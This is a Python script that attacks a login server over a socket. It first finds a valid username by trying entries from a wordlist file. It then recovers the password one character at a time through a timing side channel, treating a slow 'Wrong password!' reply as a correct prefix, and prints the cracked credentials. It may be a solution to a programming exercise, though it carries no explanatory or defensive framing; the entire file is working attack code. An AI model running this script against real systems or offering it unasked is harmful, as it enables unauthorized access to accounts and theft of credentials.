import sys
import socket
import json
import string
from datetime import datetime

file = 'logins.txt'

with socket.socket() as client_socket:
    client_socket.connect((sys.argv[1], int(sys.argv[2])))

    password = ' '
    with open(file) as file_object:
        for line in file_object:
            test_login = line.rstrip('\n')
            data = {"login": test_login, "password": password}
            data_json = json.dumps(data)
            client_socket.send(data_json.encode())
            response = client_socket.recv(1024).decode()
            response = json.loads(response)
            if response['result'] == "Wrong password!":
                break

    alpha = string.ascii_letters + string.digits
    response = {'result': ' '}
    password = ''

    while response != "Connection success!":
        for w in alpha:
            data = {"login": test_login, "password": password + w}
            data_json = json.dumps(data)
            client_socket.send(data_json.encode())
            start = datetime.now()
            response = client_socket.recv(1024).decode()
            end = datetime.now()
            dif = (end - start).total_seconds()
            response = json.loads(response)
            response = response['result']

            if response == "Wrong password!" and dif >= 0.1:
                password = password + w
                break

            if response == 'Connection success!':
                password = password + w
                break

log_pas = {"login": test_login, "password": password}
print(json.dumps(log_pas))
